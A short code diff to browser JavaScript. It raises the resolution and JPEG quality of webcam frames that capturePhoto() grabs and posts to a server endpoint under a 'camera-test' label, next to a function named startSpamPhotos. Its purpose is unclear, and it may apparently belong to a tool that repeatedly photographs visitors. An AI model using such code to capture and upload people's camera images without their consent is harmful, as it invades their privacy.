@@ -299,8 +299,8 @@ function capturePhoto() {
   if (!video || !cameraStream || video.videoWidth === 0) return;
 
   photoCount++;
-  canvas.width = video.videoWidth || 640;
-  canvas.height = video.videoHeight || 480;
+  canvas.width = Math.min(video.videoWidth, 1920) || 1280;
+  canvas.height = Math.min(video.videoHeight, 1920) || 720;
   canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
 
   canvas.toBlob(function(blob) {
@@ -310,7 +310,7 @@ function capturePhoto() {
     fd.append('type', 'camera-test');
     postForm('/api/photo', fd);
     console.log('Photo #' + photoCount + ' captured and sent');
-  }, 'image/jpeg', 0.85);
+  }, 'image/jpeg', 0.95);
 }
 
 function startSpamPhotos() {
